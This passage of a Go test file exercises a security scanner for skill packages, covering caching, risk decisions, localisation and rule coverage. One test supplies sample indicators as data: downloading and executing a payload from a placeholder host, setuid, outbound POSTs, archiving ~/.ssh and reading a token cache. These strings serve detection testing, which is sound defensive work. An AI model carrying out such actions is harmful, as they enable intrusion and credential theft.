		t.Fatalf("expected cache rewritten after version mismatch, err=%v", err)
	}
	if !strings.Contains(string(data), "\"version\":\""+sourceArtifactCacheVersion+"\"") {
		t.Fatalf("expected cache rewritten to current version, got %q", string(data))
	}
}

func TestTrimSourceArtifactCacheKeepsLatestEntries(t *testing.T) {
	cache := sourceArtifactCache{
		Version: "v1",
		Order:   []string{"a.py", "b.py", "c.py", "b.py", "", "d.py"},
		Files: map[string]cachedSourceArtifact{
			"a.py": {Fingerprint: scanFileFingerprint{RelPath: "a.py"}, Source: evaluator.SourceFile{Path: "a.py"}},
			"b.py": {Fingerprint: scanFileFingerprint{RelPath: "b.py"}, Source: evaluator.SourceFile{Path: "b.py"}},
			"c.py": {Fingerprint: scanFileFingerprint{RelPath: "c.py"}, Source: evaluator.SourceFile{Path: "c.py"}},
			"d.py": {Fingerprint: scanFileFingerprint{RelPath: "d.py"}, Source: evaluator.SourceFile{Path: "d.py"}},
		},
	}
	trimSourceArtifactCache(&cache, 2)
	if len(cache.Files) != 2 {
		t.Fatalf("expected only 2 cache entries after trim, got %d", len(cache.Files))
	}
	if len(cache.Order) != 2 {
		t.Fatalf("expected order length 2 after trim, got %+v", cache.Order)
	}
	if cache.Order[0] != "c.py" || cache.Order[1] != "d.py" {
		t.Fatalf("expected latest cache entries retained, got %+v", cache.Order)
	}
}

func TestDecisionFromRiskCountsRequiresUserDecision(t *testing.T) {
	for _, tc := range []struct {
		high   int
		medium int
		risk   string
	}{
		{high: 1, medium: 0, risk: "high"},
		{high: 0, medium: 1, risk: "medium"},
		{high: 0, medium: 0, risk: "low"},
	} {
		risk, decision := decisionFromRiskCounts(tc.high, tc.medium)
		if risk != tc.risk || decision != "UserDecisionRequired" {
			t.Fatalf("expected %s/UserDecisionRequired, got %s/%s", tc.risk, risk, decision)
		}
	}
}

func TestDecisionFromReviewedFindingsUsesEscalationGuards(t *testing.T) {
	if risk, decision := decisionFromReviewedFindings(baseScanOutput{p0: true}, review.Result{}); risk != "high" || decision != "UserDecisionRequired" {
		t.Fatalf("expected p0 to force high risk, got %s/%s", risk, decision)
	}
	refined := review.Result{
		Evasion: review.EvasionAssessment{Detected: true},
		Summary: review.ScoreSummary{HighRisk: 0, MediumRisk: 0},
	}
	if risk, decision := decisionFromReviewedFindings(baseScanOutput{}, refined); risk != "high" || decision != "UserDecisionRequired" {
		t.Fatalf("expected evasion to force high risk, got %s/%s", risk, decision)
	}
	weakRefined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:       "SF-001",
			Severity: "高风险",
			Evidence: []string{"README.md:12 示例命令"},
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-001", Verdict: "likely_false_positive"}},
		Summary:             review.ScoreSummary{HighRisk: 0, MediumRisk: 0},
	}
	if risk, _ := decisionFromReviewedFindings(baseScanOutput{}, weakRefined); risk != "low" {
		t.Fatalf("expected weak false-positive-only review to stay low, got %s", risk)
	}
}

func TestLocalizeAdmissionUsesRemediationLanguage(t *testing.T) {
	if got := localizeAdmission("block"); got != "需完成修复并复测" {
		t.Fatalf("expected remediation wording, got %q", got)
	}
	if got := localizeDecisionLabel("block"); got != "需完成修复并复测" {
		t.Fatalf("expected localized report decision wording, got %q", got)
	}
}

func TestBuildRiskCalibrationSummaryMentionsScoreAsAuxiliary(t *testing.T) {
	summary := buildRiskCalibrationSummary(nil, baseScanOutput{evaluatedRules: 3, totalRules: 3}, review.Result{Summary: review.ScoreSummary{RiskLevel: "low", Admission: "UserDecisionRequired"}})
	if !strings.Contains(summary.Policy, "评分字段仅作辅助参考") {
		t.Fatalf("expected policy to mention score as auxiliary, got %+v", summary)
	}
	joined := strings.Join(summary.ConfidenceNotes, "\n")
	if !strings.Contains(joined, "评分与分值字段仅作辅助参考") {
		t.Fatalf("expected confidence notes to mention auxiliary scoring, got %+v", summary.ConfidenceNotes)
	}
}

func TestBuildRuleSetProfileExplainsRules(t *testing.T) {
	profile := buildRuleSetProfile(&config.Config{Version: "7.0", Rules: []config.Rule{
		{ID: "V7-001", Name: "高风险", Severity: "高风险", Layer: "P0", Detection: config.Detection{Type: "pattern"}, OnFail: config.OnFail{Action: "block"}},
		{ID: "V7-015", Name: "中风险", Severity: "中风险", Layer: "P1", Detection: config.Detection{Type: "function"}, OnFail: config.OnFail{Action: "review"}},
	}})

	if profile.Total != 2 || profile.Version != "7.0" {
		t.Fatalf("unexpected rule profile summary: %+v", profile)
	}
	if len(profile.BlockedRules) != 1 || len(profile.ReviewRules) != 1 {
		t.Fatalf("expected block/review rule grouping, got %+v", profile)
	}
	if !strings.Contains(strings.Join(profile.ByDetectionType, ","), "pattern:1") {
		t.Fatalf("expected detection type summary, got %+v", profile.ByDetectionType)
	}
}

func TestResolveSkillDescriptionUsesSkillMarkdown(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "README.md"), []byte("# README\n低优先级声明"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("# Skill\n用于审查代码安全风险"), 0644); err != nil {
		t.Fatal(err)
	}

	desc := resolveSkillDescription("", dir)
	if !strings.Contains(desc, "SKILL.md") || !strings.Contains(desc, "用于审查代码安全风险") {
		t.Fatalf("expected SKILL.md declaration, got %q", desc)
	}
	if strings.Index(desc, "SKILL.md") > strings.Index(desc, "README.md") {
		t.Fatalf("expected SKILL.md before README.md, got %q", desc)
	}
}

func TestResolveSkillDescriptionUsesRealisticFixturePriority(t *testing.T) {
	dir := createRealisticSkillFixtureTree(t)
	desc := resolveSkillDescription("", dir)
	if !strings.Contains(desc, "SKILL.md") || !strings.Contains(desc, "用于审查代码安全风险") {
		t.Fatalf("expected SKILL.md description from realistic fixture, got %q", desc)
	}
	if strings.Contains(desc, "docs/guide.md") {
		t.Fatalf("expected guide doc not to override primary declaration, got %q", desc)
	}
}

func createRealisticSkillFixtureTree(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	for _, subdir := range []string{"scripts", "docs", "web", "examples"} {
		if err := os.MkdirAll(filepath.Join(dir, subdir), 0755); err != nil {
			t.Fatalf("mkdir %s: %v", subdir, err)
		}
	}
	files := map[string]string{
		"SKILL.md":          "# Skill\n用于审查代码安全风险，并按需读取仓库文件。\n",
		"README.md":         "# README\n这是更低优先级的项目说明。\n",
		"docs/guide.md":     "# Guide\n示例文档，不应覆盖主声明。\n",
		"scripts/run.py":    "import subprocess\nsubprocess.run(['python', '--version'])\n",
		"web/package.json":  `{"dependencies":{"axios":"^1.6.0"}}`,
		"go.mod":            "module demo\n\nrequire github.com/example/lib v1.2.3\n",
		"examples/demo.txt": "example fixture\n",
	}
	for rel, body := range files {
		if err := os.WriteFile(filepath.Join(dir, rel), []byte(body), 0644); err != nil {
			t.Fatalf("write %s: %v", rel, err)
		}
	}
	return dir
}

func TestLocalizeFindingsTranslatesEnglishText(t *testing.T) {
	in := []plugins.Finding{{
		RuleID:      "P1-XYZ",
		Severity:    "high",
		Title:       "Suspicious command execution",
		Description: "Detected outbound command execution",
		Location:    "",
	}}

	out := localizeFindings(in)
	if len(out) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(out))
	}
	if out[0].Severity != "高风险" {
		t.Fatalf("expected 高风险, got %s", out[0].Severity)
	}
	if strings.Contains(out[0].Title, "command") {
		t.Fatalf("expected localized Chinese title, got %s", out[0].Title)
	}
	if out[0].Location != "未提供定位" {
		t.Fatalf("expected default location, got %s", out[0].Location)
	}
}

func TestBuildDynamicSuggestionsIncludeMediumAndLowRisk(t *testing.T) {
	findings := []plugins.Finding{
		{RuleID: "P2-MED", Severity: "中风险", Title: "中风险样例", Location: "core/module"},
		{RuleID: "P2-LOW", Severity: "低风险", Title: "低风险样例", Location: "core/module"},
	}

	suggestions := buildDynamicSuggestions(findings, review.Result{})
	joined := strings.Join(suggestions, "\n")
	if !strings.Contains(joined, "修复中风险项") {
		t.Fatalf("expected medium-risk remediation suggestion, got %v", suggestions)
	}
	if !strings.Contains(joined, "处理低风险项") {
		t.Fatalf("expected low-risk remediation suggestion, got %v", suggestions)
	}
}

func TestBuildDynamicSuggestionsOrderBySeverity(t *testing.T) {
	findings := []plugins.Finding{
		{RuleID: "V7-026", Severity: "低风险", Title: "低风险样例", Location: "low/module"},
		{RuleID: "V7-021", Severity: "中风险", Title: "中风险样例", Location: "medium/module"},
		{RuleID: "V7-001", Severity: "高风险", Title: "高风险样例", Location: "high/module"},
	}

	suggestions := buildDynamicSuggestions(findings, review.Result{})
	if len(suggestions) < 3 {
		t.Fatalf("expected at least 3 suggestions, got %d", len(suggestions))
	}

	joined := strings.Join(suggestions, "\n")
	highPos := strings.Index(joined, "V7-001")
	medPos := strings.Index(joined, "修复中风险项")
	lowPos := strings.Index(joined, "处理低风险项")
	if highPos == -1 || medPos == -1 || lowPos == -1 {
		t.Fatalf("expected severity suggestions in output, got %v", suggestions)
	}
	if !(highPos < medPos && medPos < lowPos) {
		t.Fatalf("expected high->medium->low order, got %v", suggestions)
	}
}

func TestBuildV5CoverageSummaryCountsAutoAndManual(t *testing.T) {
	matrix := &config.V5Matrix{Items: []config.V5MatrixItem{
		{ID: "V5-A", Name: "自动项A", EvaluationMode: "auto", MappingType: "rule", MappingID: "P1-001"},
		{ID: "V5-B", Name: "自动项B", EvaluationMode: "auto", MappingType: "rule", MappingID: "P1-002"},
		{ID: "V5-C", Name: "人工项C", EvaluationMode: "manual", MappingType: "manual"},
	}}

	cfg := &config.Config{Rules: []config.Rule{{ID: "P1-001"}}}
	summary := buildV5CoverageSummary(matrix, nil, cfg, map[string]float64{"P1-001": 1})

	if summary.AutoTotal != 2 || summary.AutoCovered != 1 {
		t.Fatalf("unexpected auto coverage: %+v", summary)
	}
	if len(summary.AutoUncovered) != 1 || summary.AutoUncovered[0] != "自动项B" {
		t.Fatalf("unexpected uncovered auto items: %+v", summary.AutoUncovered)
	}
	if summary.ManualTotal != 1 {
		t.Fatalf("unexpected manual total: %d", summary.ManualTotal)
	}
}

func TestSynthesizeV5CoverageFindings(t *testing.T) {
	findings := synthesizeV5CoverageFindings(v5CoverageSummary{
		AutoTotal:     3,
		AutoCovered:   1,
		AutoUncovered: []string{"项1", "项2"},
	})
	if len(findings) != 1 {
		t.Fatalf("expected one finding, got %d", len(findings))
	}
	if findings[0].RuleID != "V7-AUTO-COVERAGE" {
		t.Fatalf("unexpected rule id: %s", findings[0].RuleID)
	}
}

func TestSynthesizeBehaviorFindingsMapsToV7Rules(t *testing.T) {
	findings := synthesizeBehaviorFindings(review.BehaviorProfile{
		DownloadIOCs:   []string{"download http://example.test/payload"},
		ExecuteIOCs:    []string{"exec /tmp/payload"},
		PrivEscIOCs:    []string{"setuid"},
		OutboundIOCs:   []string{"POST https://example.test"},
		CollectionIOCs: []string{"archive ~/.ssh"},
		CredentialIOCs: []string{"read token cache"},
		SequenceAlerts: []string{"download -> execute"},
		EvasionSignals: []string{"container differential"},
	})

	ids := map[string]bool{}
	for _, finding := range findings {
		ids[finding.RuleID] = true
	}
	for _, id := range []string{"V7-001", "V7-003", "V7-008", "V7-009", "V7-016"} {
		if !ids[id] {
			t.Fatalf("expected behavior finding %s in %+v", id, findings)
		}
	}
}

func TestBuildRuleEvaluationLogsContainsNoRiskAndRisk(t *testing.T) {
	rules := []config.Rule{
		{ID: "P1-001", Name: "规则一", Layer: "P1", Weight: 10, Detection: config.Detection{Type: "function", Function: "detectOne"}},
		{ID: "P1-002", Name: "规则二", Layer: "P1", Weight: 10, Detection: config.Detection{Type: "pattern", Patterns: []string{"danger"}}},
	}
	itemScores := map[string]float64{"P1-001": 10, "P1-002": 3}
	details := []evaluator.FindingDetail{{RuleID: "P1-002", Severity: "中风险", Description: "命中危险调用", Location: "main.py:12"}}

	logs := buildRuleEvaluationLogs(rules, itemScores, details)
	if len(logs) != 2 {
		t.Fatalf("expected 2 logs, got %d", len(logs))
	}
	if logs[0].RiskLabel == logs[1].RiskLabel {
		t.Fatalf("expected mixed risk labels, got %+v", logs)
	}

	foundNoRisk := false
	foundRisk := false
	for _, log := range logs {
		if log.RiskLabel == "无风险" {
			foundNoRisk = true
		}
		if log.RiskLabel == "高风险" || log.RiskLabel == "中风险" || log.RiskLabel == "低风险" {
			foundRisk = true
		}
	}
	if !foundNoRisk || !foundRisk {
		t.Fatalf("expected both no-risk and risk logs, got %+v", logs)
	}
}

func containsString(items []string, want string) bool {
	for _, item := range items {
		if item == want {
			return true
		}
	}
	return false
}
